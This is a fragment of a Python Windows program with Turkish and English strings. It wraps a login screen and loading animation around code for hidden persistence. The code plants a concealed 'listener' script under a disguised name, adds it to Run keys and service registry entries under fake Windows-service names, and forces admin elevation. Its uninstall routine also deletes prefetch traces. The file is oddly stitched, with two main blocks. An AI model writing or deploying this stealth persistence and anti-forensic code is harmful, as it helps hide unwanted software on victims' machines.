                LANGUAGES[lang]['installing_python_req'],
                LANGUAGES[lang]['installing_packages'],
                LANGUAGES[lang]['downloading_requirements'],
                LANGUAGES[lang]['requirements_success']
            ]
        elif operation_type == "uninstall":
            info_texts = [
                LANGUAGES[lang]['uninstalling'],
                "Dosyalar kaldırılıyor..." if lang == 'tr' else "Removing files...",
                "Temizlik yapılıyor..." if lang == 'tr' else "Cleaning up...",
                LANGUAGES[lang]['uninstalled']
            ]
        else:  
            info_texts = [
                "Preparing installation...",
                "Checking system requirements...",
                "Downloading necessary files...",
                "Almost ready...",
                "Finalizing setup..."
            ]
        info_label_font = ctk.CTkFont(family="Segoe UI", size=16, weight="bold")
        info_label = ctk.CTkLabel(loading_frame, text=info_texts[0], font=info_label_font, text_color="white")
        info_label.pack(pady=(40, 20))

        progress_bar_width = 320
        progress_bar_height = 18
        progress_container = ctk.CTkFrame(loading_frame, width=progress_bar_width, height=progress_bar_height, corner_radius=0, fg_color="#1c1c1e")
        progress_container.pack(pady=(0, 30))
        progress_container.pack_propagate(False)

        bar_bg_color = "#232336"
        progress_bg_label = ctk.CTkLabel(progress_container, text="", fg_color=bar_bg_color, width=progress_bar_width, height=progress_bar_height, corner_radius=0)
        progress_bg_label.place(x=0, y=0)

        def create_gradient_fill(width, height):
            color1 = (255, 255, 255)
            color2 = (0, 0, 0)
            base = Image.new('RGB', (width, height), color1)
            top = Image.new('RGB', (width, height), color2)
            mask = Image.new('L', (width, height))
            for x in range(width):
                mask_line = int(255 * (x / width))
                for y in range(height):
                    mask.putpixel((x, y), mask_line)
            base.paste(top, (0, 0), mask)
            return CTkImage(light_image=base, dark_image=base, size=(width, height))

        progress_fill_label = ctk.CTkLabel(progress_container, text="", fg_color="transparent", width=0, height=progress_bar_height, corner_radius=0)
        progress_fill_label.place(x=0, y=0)
        progress_fill_label.lift()

        def animate_label_change(new_text):
            def type_in(idx=0):
                if not info_label.winfo_exists(): return
                if idx > len(new_text): return
                info_label.configure(text=new_text[:idx])
                root.after(22, lambda: type_in(idx+1))
            type_in()

        current_progress = [0]
        is_finished = [False]
        
        def update_progress(progress, text=None):
            if not loading_frame.winfo_exists():
                return
            current_progress[0] = min(100, max(0, progress))
            current_progress_width = int(progress_bar_width * (current_progress[0] / 100))
            if current_progress_width < 1:
                current_progress_width = 1
            
            try:
                gradient_img = create_gradient_fill(current_progress_width, progress_bar_height)
                progress_fill_label.configure(width=current_progress_width, image=gradient_img)
                
            except Exception as e:
                print(f"[DEBUG] Progress bar image update error: {e}")
                try:
                    progress_fill_label.configure(width=current_progress_width, fg_color="#ffffff")
                    progress_fill_label._image = None
                except:
                    pass
            
            if text:
                animate_label_change(text)
        
        def finish_loading():
            is_finished[0] = True
            current_progress[0] = 100
            update_progress(100)
            
            def fade_out(alpha=0.97):
                if alpha <= 0.2:
                    loading_frame.destroy()
                    loading_canvas.destroy()
                    bar.destroy()
                    root.attributes("-alpha", 0.2)
                    main_frame.lift()
                    if not main_frame_is_ready[0]:
                        show_main_ui()
                    root.after(10, lambda: root.attributes("-alpha", 0.99))
                    on_finish()
                    return
                main_frame.lift()
                root.attributes("-alpha", alpha)
                root.after(12, lambda: fade_out(alpha - 0.025))
            fade_out()

        def animate_loading(step=0):
            if is_finished[0]:
                return
            if step < current_progress[0]:
                current_progress_width = int(progress_bar_width * (step / 100))
                if current_progress_width < 1:
                    current_progress_width = 1
                gradient_img = create_gradient_fill(current_progress_width, progress_bar_height)
                progress_fill_label.configure(width=current_progress_width, image=gradient_img)
                root.after(15, lambda: animate_loading(step + 1))
            else:
                root.after(50, lambda: animate_loading(step))
        
        if progress_callback:
            progress_callback(update_progress, finish_loading)
        else:
            def auto_animate(step=0):
                if step < 100:
                    update_progress(step)
                    if step % 20 == 0:
                        animate_label_change(random.choice(info_texts))
                    root.after(15, lambda: auto_animate(step + 1))
                else:
                    finish_loading()
            auto_animate()
        
        animate_loading()

    global header_title, install_btn, uninstall_btn, get_hwid_btn, download_req_btn, status_label, lang_btn
    header_title = None
    install_btn = None
    uninstall_btn = None
    get_hwid_btn = None
    download_req_btn = None
    status_label = None
    lang_btn = None

    header_bar_img = CTkImage(light_image=Image.new('RGB', (WINDOW_WIDTH, HEADER_BAR_HEIGHT), PRIMARY_COLOR), 
                             dark_image=Image.new('RGB', (WINDOW_WIDTH, HEADER_BAR_HEIGHT), PRIMARY_COLOR), 
                             size=(WINDOW_WIDTH, HEADER_BAR_HEIGHT))

    blur_bg_img = create_blur_bg(WINDOW_WIDTH, WINDOW_HEIGHT, "#232336", PRIMARY_COLOR)

    bg_label = ctk.CTkLabel(root, image=blur_bg_img, text="", fg_color="transparent")
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)
    bg_label.lower()

    glow_frame = ctk.CTkFrame(
        root, 
        width=WINDOW_WIDTH+20, 
        height=WINDOW_HEIGHT+20,
        fg_color=NEON_GLOW,
        corner_radius=15
    )
    glow_frame.place(x=-10, y=-10)
    glow_frame.lower()

    header_bar = ctk.CTkLabel(
        root,
        image=header_bar_img,
        text="",
        fg_color="transparent",
        width=WINDOW_WIDTH,
        height=HEADER_BAR_HEIGHT
    )
    header_bar.place(x=0, y=0, relwidth=1)
    header_bar.lift()
    header_bar.bind("<Button-1>", start_move)
    header_bar.bind("<B1-Motion>", do_move)

    main_frame = ctk.CTkFrame(root, corner_radius=0, fg_color="#1c1c1e", width=WINDOW_WIDTH, height=WINDOW_HEIGHT-HEADER_BAR_HEIGHT-22)
    main_frame.place(x=0, y=HEADER_BAR_HEIGHT)
    main_frame.lower()
    main_frame_is_ready = [False]


    global main_update_id, main_dpi_id, main_countdown_id
    main_update_id = [None]
    main_dpi_id = [None]
    main_countdown_id = [None]


    def on_login_success(auth):
        print("[INFO] Starting main application after successful login")
        
        root.is_authenticated = True
        root.auth = auth
        
        try:
            with open("login_log.txt", "a") as f:
                f.write(f"{datetime.datetime.now()} - Login successful: {auth.registered_username}\n")
        except:
            pass
            
        initial_fade_in()
        animate_window_open()
        show_loading_screen(root, show_main_ui)
        
        after_id = root.after(5000, check_authentication)
        after_ids.append(after_id)
        
        root.deiconify()
        root.update()

    def check_authentication():
        if not hasattr(root, 'is_authenticated') or not root.is_authenticated:
            print("[SECURITY] Unauthorized access attempt detected!")
            return
        after_id = root.after(5000, check_authentication)
        after_ids.append(after_id)
    
    root.withdraw()
    login_window = LoginWindow(root, on_login_success)

    def show_top_right_buttons():
        global lang_btn_tk, close_btn_tk
        btn_size = 20
        gap = 12
        close_btn_tk = tk.Button(
            root,
            text="✕",
            width=2,
            height=1,
            font=("Segoe UI", btn_size-6, "bold"),
            fg="#000000",
            bg=PRIMARY_COLOR,
            activebackground=ACCENT_COLOR,
            activeforeground="#000",
            borderwidth=0,
            highlightthickness=0,
            relief="flat",
            command=close
        )
        close_btn_tk.place(x=WINDOW_WIDTH-btn_size-4, y=7, width=btn_size, height=btn_size)
        lang_btn_tk = tk.Button(
            root,
            text=current_lang['lang'].upper(),
            width=2,
            height=1,
            font=("Segoe UI", btn_size-7, "bold"),
            fg="#000000",
            bg=PRIMARY_COLOR,
            activebackground=ACCENT_COLOR,
            activeforeground="#000",
            borderwidth=0,
            highlightthickness=0,
            relief="flat",
            command=on_lang
        )
        lang_btn_tk.place(x=WINDOW_WIDTH-2.2*btn_size-gap-1, y=0)

    old_show_main_ui = show_main_ui
    def show_main_ui_with_buttons():
        old_show_main_ui()
        show_top_right_buttons()
    show_main_ui = show_main_ui_with_buttons

    def show_main_ui_with_footer():
        show_main_ui_with_buttons()
        show_footer_bar()
    show_main_ui = show_main_ui_with_footer

    root.mainloop()

if __name__ == "__main__":
    try:
        debug_file_locations()
        main()
    except Exception:
        traceback.print_exc()
        input("\n\nBir hata oluştu. ENTER ile çık...")


def uninstall_everything():
    try:
        print("[DEBUG] uninstall_everything başladı")
        uninstall_listener()
        
        try:
            paths = get_hidden_paths()
            listener_path = paths.get('listener', '')
            folder_path = paths.get('folder', '')
            proc_name = paths.get('proc_name', '')
        except Exception as e:
            print(f"[WARN] Config dosyası okunamadı: {e}")
            paths = {}
            listener_path = ''
            folder_path = ''
            proc_name = ''
        
        if not listener_path and not folder_path:
            print("[WARN] Kurulum bilgileri bulunamadı, tüm olası yollarda arama yapılıyor...")
            
        files_to_remove = []
        
        if os.path.exists(listener_path):
            files_to_remove.append(listener_path)
        
        if folder_path and os.path.exists(folder_path):
            winhost_path = os.path.join(folder_path, 'windowsaudiohost.pyw')
            if os.path.exists(winhost_path):
                files_to_remove.append(winhost_path)
        
        for fpath in files_to_remove:
            try:
                if os.path.exists(fpath):
                    subprocess.run(f'attrib -h "{fpath}"', shell=True, creationflags=0x08000000)
                    os.remove(fpath)
                    print(f"[INFO] Dosya silindi: {fpath}")
            except Exception as e:
                print(f"[WARN] Dosya silme hatası {fpath}: {e}")
        
        try:
            for hidden_path in HIDDEN_PATHS:
                try:
                    if os.path.exists(hidden_path):
                        for filename in os.listdir(hidden_path):
                            file_path = os.path.join(hidden_path, filename)
                            
                            if os.path.isfile(file_path):
                                if filename in MASK_FILES:
                                    try:
                                        subprocess.run(f'attrib -h "{file_path}"', shell=True, creationflags=0x08000000)
                                        os.remove(file_path)
                                        print(f"[MASK] Removed mask file: {filename} from {hidden_path}")
                                    except Exception as e:
                                        print(f"[WARN] Mask dosyası kaldırma hatası {filename}: {e}")
                                else:
                                    base_names = ['cache', 'system', 'config', 'data', 'log', 'temp', 'backup',
                                                'settings', 'preferences', 'theme', 'display', 'window', 'user',
                                                'sync', 'update', 'service', 'host', 'audio', 'media', 'network']
                                    extensions = ['.log', '.dat', '.cfg', '.ini', '.txt', '.cache', '.tmp', '.bak']
                                    
                                    should_delete = False
                                    for base in base_names:
                                        for ext in extensions:
                                            if base in filename.lower() and filename.lower().endswith(ext):
                                                if len(filename) > len(base + ext) + 1:
                                                    should_delete = True
                                                    break
                                        if should_delete:
                                            break
                                    
                                    if should_delete:
                                        try:
                                            subprocess.run(f'attrib -h "{file_path}"', shell=True, creationflags=0x08000000)
                                            os.remove(file_path)
                                            print(f"[RANDOM] Removed random file: {filename} from {hidden_path}")
                                        except Exception as e:
                                            print(f"[WARN] Random dosya kaldırma hatası {filename}: {e}")
                                    
                except Exception as e:
                    print(f"[WARN] Yol kontrol hatası {hidden_path}: {e}")
                    continue
                    
        except Exception as e:
            print(f"[WARN] Dosya temizleme hatası: {e}")
        
        try:
            if folder_path and os.path.exists(folder_path) and not os.listdir(folder_path):
                os.rmdir(folder_path)
                print(f"[INFO] Boş klasör kaldırıldı: {folder_path}")
        except Exception as e:
            print(f"[WARN] Klasör silme hatası: {e}")
        
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
                try:
                    i = 0
                    while True:
                        name, value, _ = winreg.EnumValue(reg_key, i)   
                        if any(keyword in str(value).lower() for keyword in ['pythonw', 'python', 'UserDataSync', 'WindowsSearchService', 'WindowsUpdateService', 'setup']):
                            for hidden_path in HIDDEN_PATHS:
                                if hidden_path in str(value):
                                    try:
                                        winreg.DeleteValue(reg_key, name)
                                        print(f"[INFO] HKEY_CURRENT_USER Registry kaydı kaldırıldı: {name} = {value}")
                                        break
                                    except Exception:
                                        pass
                        i += 1
                except WindowsError:
                    pass
        except Exception as e:
            print(f"[WARN] HKEY_CURRENT_USER Registry silme hatası: {e}")
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
                try:
                    i = 0
                    while True:
                        name, value, _ = winreg.EnumValue(reg_key, i)
                        if any(keyword in str(value).lower() for keyword in ['pythonw', 'python', 'listener', 'xir', 'setup']):
                            for hidden_path in HIDDEN_PATHS:
                                if hidden_path in str(value):
                                    try:
                                        winreg.DeleteValue(reg_key, name)
                                        print(f"[INFO] HKEY_LOCAL_MACHINE Registry kaydı kaldırıldı: {name} = {value}")
                                        break
                                    except Exception:
                                        pass
                        i += 1
                except WindowsError:
                    pass
        except Exception as e:
            print(f"[WARN] HKEY_LOCAL_MACHINE Registry silme hatası: {e}")
        
        try:
            task_names = [
                "UserDataSync", "WindowsSearchService", "WindowsUpdateService", "UserDataSync",
                "WindowsSystemService", "SystemConfigUpdate", "UserDataSync", "WindowsSearchService",
                "SystemMaintenance", "WindowsDefender", "WindowsUpdate", "SystemRestore",
                "WindowsBackup", "SystemOptimization", "WindowsCleanup", "SystemDiagnostics"
            ]
            
            for task_name in task_names:
                try:
                    result = subprocess.run(f'schtasks /Query /TN "{task_name}"', shell=True, capture_output=True, creationflags=0x08000000)
                    if result.returncode == 0:
                        subprocess.run(f'schtasks /Delete /TN "{task_name}" /F', shell=True, capture_output=True, creationflags=0x08000000)
                        print(f"[INFO] Task Scheduler görevi silindi: {task_name}")
                except Exception:
                    continue
            
            try:
                result = subprocess.run('schtasks /Query /FO CSV', shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore', creationflags=0x08000000)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if any(keyword in line.lower() for keyword in ['pythonw', 'python', 'listener', 'xir', 'setup', 'system_config']):
                            parts = line.split(',')
                            if len(parts) > 0:
                                task_name = parts[0].strip('"')
                                try:
                                    subprocess.run(f'schtasks /Delete /TN "{task_name}" /F', shell=True, capture_output=True, creationflags=0x08000000)
                                    print(f"[INFO] Listener ile ilgili Task Scheduler görevi bulundu ve silindi: {task_name}")
                                except Exception as e:
                                    print(f"[WARN] Görev silme hatası {task_name}: {e}")
            except Exception as e:
                print(f"[WARN] Tüm görevleri listeleme hatası: {e}")
                
        except Exception as e:
            print(f"[WARN] Task Scheduler görevi silinemedi: {e}")
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
                try:
                    i = 0
                    while True:
                        name, value, _ = winreg.EnumValue(reg_key, i)
                        if any(keyword in str(value).lower() for keyword in ['pythonw', 'python', 'listener', 'xir', 'setup']):
                            for hidden_path in HIDDEN_PATHS:
                                if hidden_path in str(value):
                                    try:
                                        winreg.DeleteValue(reg_key, name)
                                        print(f"[INFO] RunOnce Registry kaydı kaldırıldı: {name} = {value}")
                                        break
                                    except Exception:
                                        pass
                        i += 1
                except WindowsError:
                    pass
        except Exception as e:
            print(f"[WARN] RunOnce Registry silme hatası: {e}")
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
                try:
                    i = 0
                    while True:
                        name, value, _ = winreg.EnumValue(reg_key, i)
                        if any(keyword in str(value).lower() for keyword in ['pythonw', 'python', 'listener', 'xir', 'setup']):
                            for hidden_path in HIDDEN_PATHS:
                                if hidden_path in str(value):
                                    try:
                                        winreg.DeleteValue(reg_key, name)
                                        print(f"[INFO] HKEY_CURRENT_USER RunOnce Registry kaydı kaldırıldı: {name} = {value}")
                                        break
                                    except Exception:
                                        pass
                        i += 1
                except WindowsError:
                    pass
        except Exception as e:
            print(f"[WARN] HKEY_CURRENT_USER RunOnce Registry silme hatası: {e}")
        
        try:
            prefetch_dir = os.path.join(os.environ['WINDIR'], 'Prefetch')
            if os.path.exists(prefetch_dir):
                for file in os.listdir(prefetch_dir):
                    if 'pythonw' in file.lower() or 'python' in file.lower():
                        try:
                            os.remove(os.path.join(prefetch_dir, file))
                            print(f"[INFO] Prefetch dosyası silindi: {file}")
                        except Exception:
                            pass
        except Exception as e:
            print(f"[WARN] Prefetch temizliği hatası: {e}")
        
        print("[INFO] Güvenli kaldırma tamamlandı!")
        print("[DEBUG] uninstall_everything tamamlandı")
        return True
        
    except Exception as e:
        print(f"[ERROR] Kaldırma hatası: {e}")
        import traceback
        traceback.print_exc()
        return False

def ensure_admin():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    if not is_admin:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, ' '.join([f'"{arg}"' for arg in sys.argv]), None, 1
        )
        sys.exit(0)

if __name__ == "__main__":
    ensure_admin()
    main()



payload_running = [False]
def start_payload_once(*args, **kwargs):
    if payload_running[0]:
        return
    payload_running[0] = True

def schedule_listener():
    pass

def add_registry_startup(pythonw, listener_path):
    try:
        import winreg
        
        registry_names = [
            "WindowsSystemService",
            "SystemConfigUpdate", 
            "WindowsSearchService",
            "UserDataSync"
        ]
        registry_name = random.choice(registry_names)
        
        print(f"[DEBUG] Registry adı: {registry_name}")
        
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                try:
                    winreg.DeleteValue(reg_key, registry_name)
                    print(f"[DEBUG] Eski registry kaydı temizlendi: {registry_name}")
                except WindowsError:
                    pass
                
                command = f'"{pythonw}" "{listener_path}"'
                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, command)
                print(f"[SUCCESS] Registry startup kaydı eklendi: {registry_name}")
                print(f"[DEBUG] Registry komutu: {command}")
                return True
                
        except Exception as e:
            print(f"[WARN] HKEY_CURRENT_USER registry hatası: {e}")
            
            try:
                key = winreg.HKEY_LOCAL_MACHINE
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                    try:
                        winreg.DeleteValue(reg_key, registry_name)
                        print(f"[DEBUG] Eski HKEY_LOCAL_MACHINE registry kaydı temizlendi: {registry_name}")
                    except WindowsError:
                        pass
                    
                    command = f'"{pythonw}" "{listener_path}"'
                    winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, command)
                    print(f"[SUCCESS] HKEY_LOCAL_MACHINE registry startup kaydı eklendi: {registry_name}")
                    print(f"[DEBUG] Registry komutu: {command}")
                    return True
                    
            except Exception as e2:
                print(f"[WARN] HKEY_LOCAL_MACHINE registry hatası: {e2}")
                return False
                
    except Exception as e:
        print(f"[ERROR] Registry startup ekleme hatası: {e}")
        return False

def add_registry_startup_services(pythonw, listener_path):
    try:
        import winreg
        
        service_registry_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices")
        ]
        
        service_names = [
            "WindowsSystemService",
            "SystemConfigUpdate", 
            "WindowsSearchService",
            "UserDataSync"
        ]
        service_name = random.choice(service_names)
        
        print(f"[DEBUG] Windows servis registry adı: {service_name}")
        
        for hkey, key_path in service_registry_keys:
            try:
                with winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE) as reg_key:
                    try:
                        service_key = winreg.CreateKey(reg_key, service_name)
                        
                        winreg.SetValueEx(service_key, "Type", 0, winreg.REG_DWORD, 0x10)
                        winreg.SetValueEx(service_key, "Start", 0, winreg.REG_DWORD, 0x2)
                        winreg.SetValueEx(service_key, "ErrorControl", 0, winreg.REG_DWORD, 0x1)
                        
                        command = f'"{pythonw}" "{listener_path}"'
                        winreg.SetValueEx(service_key, "ImagePath", 0, winreg.REG_EXPAND_SZ, command)
                        
                        winreg.SetValueEx(service_key, "DisplayName", 0, winreg.REG_SZ, service_name)
                        
                        description = "Windows System Service for configuration updates"
                        winreg.SetValueEx(service_key, "Description", 0, winreg.REG_SZ, description)
                        
                        winreg.CloseKey(service_key)
                        print(f"[SUCCESS] Windows servis registry kaydı eklendi: {service_name} -> {key_path}")
                        return True
                        
                    except Exception as e:
                        print(f"[WARN] Servis anahtarı oluşturma hatası {key_path}: {e}")
                        continue
                        
            except Exception as e:
                print(f"[WARN] Registry anahtarı açma hatası {key_path}: {e}")
                continue
                
        return False
        
    except Exception as e:
        print(f"[ERROR] Windows servis registry ekleme hatası: {e}")
        return False